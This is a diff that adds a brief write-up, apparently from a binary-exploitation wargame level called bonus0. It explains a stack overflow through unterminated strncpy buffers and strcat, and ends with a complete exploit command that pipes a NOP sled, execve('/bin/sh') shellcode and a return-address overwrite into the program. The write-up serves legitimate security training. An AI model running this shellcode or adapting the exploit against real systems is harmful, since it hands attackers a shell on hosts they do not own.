@@ -1,0 +1,14 @@
+As usual we try to understand program with objdump and gdb looking for exploitable
+functions.
+We found strcpy and strlen and strcat, which with the help of strncpy open path for
+non-nullterminated strings and overflows.
+There are 4 buffers in program one in main which will be used to overwrite eip of main
+to our shellcode. Two buffers one after another which are "protected" via strncpy
+but vulnerable to be not null-terminated and one big buffer which we will use as a
+storage to shellcode.
+So idea is to overwrite eip of main to continue execution with our code stored in
+collapsed stack.
+To overwrite we will use the fact that strcpy will continue copying buf b after
+non-terminated buf a and then strcat will add buf b to those already copied, so we
+will go beyond the main buf of size 42 by up to 18 bytes.
+>>(python -c "print 'a' * 20 + '\x90' * 700 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"; python -c "print 'a' * 14 + '\xbf\xff\xe7\xfc'[::-1] + '\xff'"; cat) | ./bonus0
